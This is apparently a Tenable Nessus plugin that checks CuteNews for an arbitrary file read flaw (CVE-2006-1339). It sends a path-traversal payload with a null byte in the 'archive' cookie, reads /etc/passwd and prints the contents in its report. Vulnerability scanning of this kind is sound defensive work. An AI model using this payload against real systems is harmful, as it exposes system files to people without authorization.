#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that allows reading of
arbitrary files. 

Description :

The version of CuteNews installed on the remote host fails to properly
sanitize the 'archive' parameter before using it to read a news file
and return it.  An unauthenticated remote attacker may be able to
leverage this issue to read arbitrary files on the remote host subject
to permissions of the web server user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled. 

See also : 

http://www.hamid.ir/security/cutenews.txt

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description)
{
  script_id(21119);
  script_version ("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1339", "CVE-2006-1340");
  script_bugtraq_id(17152);

  script_name(english:"CuteNews archive Parameter Information Disclosure Vulnerability");

  script_summary(english:"Tries to read a file via archive parameter of CuteNews");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("cutenews_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../etc/passwd%00";
  req = http_get(item:string(dir, "/example2.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: archive=", file, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    # Piece the file back together.
    contents = "";
    while (res = strstr(res, "example2.php?subaction=showcomments&amp;id="))
    {
      entry = strstr(res, "id=");
      if (entry) entry = entry - "id=";
      if (entry) entry = entry - strstr(entry, "&amp;");
      if (entry) 
      {
        contents += entry;
        res = strstr(res, entry);
      }
      else break;
    }

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_note(port:port, data:report);
    exit(0);
  }
}
